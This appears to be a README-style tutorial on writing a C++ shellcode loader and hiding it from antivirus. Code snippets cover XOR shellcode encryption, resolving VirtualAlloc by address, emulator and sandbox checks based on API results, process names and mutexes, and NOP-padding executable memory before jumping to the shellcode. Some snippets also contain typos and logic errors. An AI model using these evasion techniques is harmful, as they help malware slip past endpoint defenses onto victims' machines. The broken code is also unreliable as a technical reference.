# Countering antivirus roadmap

Below I will outline several ways to write a shellcode loader in memory and how to hide it from antivirus on C++.

1. [Shellcode encryption](#1)
2. [Using functions via address](#2)

## <a name="1">Shellcode encryption </a>
The simplest and most important way to hide the load is shellcode encryption , this will help bypass static analysis of your file.
You can use both simple xor and more complex encryption methods such as rc4 , etc .

for example:

```
  const char key[]="somekey";
  const char shellcode[]="some shellcode";
  
  char coded[sizeof(shellcode)];
  
  for (int i=0,j=0; i<sizeof(shellcode); i++,j++){
    if (!(j<sizeof(key))) {
    j=0;
    }
    coded[i] = shellcode[i] ^ key[j];
  }
```

## <a name="2">Using functions via address</a>

You can use instead of a direct function call , a call through the address of this function in memory

for example:
```
  typedef LPVOID(__cdecl *MPROC)(LPVOID,SIZE_T,DWORD,DWORD;
  
  MPROC Alloc = (MPROC)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")),"VirtualAlloc");
  char *ex = (char*)Alloc(NULL,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE-READWRITE);
```

## Result processing Windows API

The antivirus emulator may not handle all Windows API functions and returns by default Null

for example:
```
  LPVOID res = NULL;
  res = VirtualAllocExNuma(GetCurrentProcess(), NULL, 100, MEM_REVERSE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
  
  if (res != NULL )
  {
    //exec shellcode
  }
  return 0;
```
## Сhecking the process name

Antivirus during the binary file check can run it not with the original name, to bypass dynamic checking, you can check the name of the file being run.

for example:
```
 int main ( int argc, char* argv[])
 {
  if (argv[0] == "my_name.exe")
  {
    //exec shellcode
  } 
  return 0;
 } 
```

## Сhecking mutex before launching

You can start the program execution process only if a certain mutex is found in the system. If you try to create an existing mutex, the process throws an error.

for example:
```
 HANDLE mutex;
 mutex = CreateMutex( NULL, TRUE, "MY_MUTEX");
 
 if ( GetLastError() == ERROR_ALREADY_EXIST );
 {
  // exec shellcode
 }
 esle 
 {
  startExe("my_proc.exe");
  Sleep(1000);
 }
 return 0;
```

## <a name="Allocating">Allocating a large amount of memory for shellcode</a>

With dynamic program analysis, antiviruses analyze the allocated memory, but they can analyze a certain amount of memory. you can allocate more memory than is necessary to write the silk code and write the first part, which will be analyzed by antivir with empty bytes.

for example:
```
 char *ex = VirtualAlloc(NULL, sizeof(shellcode)*2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 char *ex2 = ex + sizeof(shellcode);
 memcpy(ex2, shellcode, sizeof(shellcode));
 
 for( int i=0; i<=sizeof(shellcode)-1; i++)
 {
  ex[i] = 0x90;
 }
 
 ((void(*)())ex)();
```
